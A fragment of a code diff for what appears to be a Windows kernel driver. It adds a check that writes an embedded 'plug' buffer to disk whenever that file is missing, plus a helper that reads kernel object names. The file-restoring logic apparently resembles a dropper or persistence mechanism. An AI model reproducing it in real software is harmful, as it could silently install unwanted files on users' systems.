+    status=bAceessFile(g_pPlugPath);
     if(status==STATUS_OBJECT_NAME_NOT_FOUND) {
         status=MzWriteFile(g_pPlugPath,g_pPlugBuffer,g_iPlugSize);
     }
@@ -2415,6 +2430,27 @@ NTSTATUS bAceessFile(PCWSTR FileName)
     return ntStatus;
 }
 
+
+NTSTATUS LfGetObjectName( IN CONST PVOID Object, OUT PUNICODE_STRING* ObjectName )
+{
+    NTSTATUS        Status = STATUS_INSUFFICIENT_RESOURCES;
+    PUNICODE_STRING TmpName;
+    ULONG           ReturnLength;
+
+    ObQueryNameString( Object, (POBJECT_NAME_INFORMATION)&ReturnLength, sizeof(ULONG), &ReturnLength );
+    *ObjectName = NULL;
+    TmpName = (PUNICODE_STRING)kmalloc( ReturnLength );
+    if ( TmpName ) {
+        Status = ObQueryNameString( Object, (POBJECT_NAME_INFORMATION)TmpName, ReturnLength, &ReturnLength );
+        if ( NT_SUCCESS(Status) ) {
+            *ObjectName = TmpName;
+        } else {
+            kfree( TmpName );
+        }
+    }
+
+    return Status;
+}
 
 
 /* EOF */
